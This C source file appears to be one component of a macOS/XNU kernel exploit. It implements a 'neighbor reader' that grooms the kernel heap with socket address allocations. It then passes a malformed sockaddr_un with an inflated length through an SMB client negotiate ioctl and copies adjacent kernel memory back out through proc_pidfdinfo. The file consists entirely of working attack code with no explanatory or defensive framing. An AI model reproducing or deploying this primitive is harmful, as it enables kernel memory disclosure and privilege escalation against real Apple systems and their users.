//
//  neighbor_reader.c
//  kmem_xepg
//
//  Created by admin on 12/20/21.
//

#include <assert.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libproc.h>

#include <sys/un.h>
#include <sys/errno.h>

#include "neighbor_reader.h"
#include "platform_constants.h"

#include "../xnu/saddr_allocator.h"
#include "../smb/client.h"


struct kmem_neighbor_reader {
    xnu_saddr_allocator_t reader_allocator;
    xnu_saddr_allocator_t pad_allocator;
    int fd_smb;
    
    enum {
        STATE_CREATED,
        STATE_READ
    } state;
};

void kmem_neighbor_reader_init_saddr_allocators(kmem_neighour_reader_t reader) {
    assert(reader->reader_allocator == NULL);
    assert(reader->pad_allocator == NULL);
    reader->reader_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64 * 128);
    reader->pad_allocator = xnu_saddr_allocator_create(XE_PAGE_SIZE / 64);
}

kmem_neighour_reader_t kmem_neighbor_reader_create(void) {
    int fd_smb = smb_client_open_dev();
    assert(fd_smb >= 0);
    kmem_neighour_reader_t reader = malloc(sizeof(struct kmem_neighbor_reader));
    bzero(reader, sizeof(struct kmem_neighbor_reader));
    kmem_neighbor_reader_init_saddr_allocators(reader);
    reader->fd_smb = fd_smb;
    reader->state = STATE_CREATED;
    return reader;
}

int kmem_neighour_reader_read(kmem_neighour_reader_t reader, char* out, uint8_t size) {
    assert(reader->state == STATE_CREATED);
    assert(size < 128);
    assert(size >= 64);
    reader->state = STATE_READ;
    
    struct sockaddr_un addr;
    bzero(&addr, sizeof(addr));
    addr.sun_len = size * 2;
    static_assert(sizeof(addr) >= 64 + sizeof(uint8_t), "");
    *((uint8_t*)((uintptr_t)&addr + 64)) = size + (size - 64);
    
    xnu_saddr_allocator_allocate(reader->reader_allocator);
    xnu_saddr_allocator_fragment(reader->reader_allocator, XE_PAGE_SIZE / 64 / 8);
    xnu_saddr_allocator_allocate(reader->pad_allocator);
    
    smb_client_ioc_negotiate(reader->fd_smb, (struct sockaddr_in*)&addr, size, 0);
    
    size_t num_modified_expected = (((size * 2) + (64 - 1)) / 64) - 1;
    int fds_modified[num_modified_expected];
    bzero(fds_modified, sizeof(fds_modified));
    size_t num_modified_actual = num_modified_expected;
    int error = xnu_saddr_allocator_find_modified(reader->reader_allocator, fds_modified, &num_modified_actual);
    if (error) {
        return error;
    }
    
    if (num_modified_expected != num_modified_actual) {
        return EIO;
    }
    
    for (int i=0; i<num_modified_expected; i++) {
        int fd = fds_modified[i];
        struct socket_fdinfo info;
        int read = proc_pidfdinfo(getpid(), fd, PROC_PIDFDSOCKETINFO, &info, sizeof(info));
        assert(read == sizeof(info));
        struct sockaddr_un* addr = &info.psi.soi_proto.pri_un.unsi_addr.ua_sun;
        if (addr->sun_len == (size + size - 64)) {
            memcpy(out, (char*)addr + (size - 64), size);
            return 0;
        }
    }
    
    return EBADF;
}

void kmem_neighbor_reader_reset(kmem_neighour_reader_t reader) {
    assert(reader->state == STATE_READ);
    xnu_saddr_allocator_destroy(&reader->reader_allocator);
    xnu_saddr_allocator_destroy(&reader->pad_allocator);
    kmem_neighbor_reader_init_saddr_allocators(reader);
    reader->state = STATE_CREATED;
}

void kmem_neighbor_reader_destroy(kmem_neighour_reader_t* reader_p) {
    kmem_neighour_reader_t reader = *reader_p;
    xnu_saddr_allocator_destroy(&reader->reader_allocator);
    xnu_saddr_allocator_destroy(&reader->pad_allocator);
    close(reader->fd_smb);
    free(reader);
    *reader_p = NULL;
}
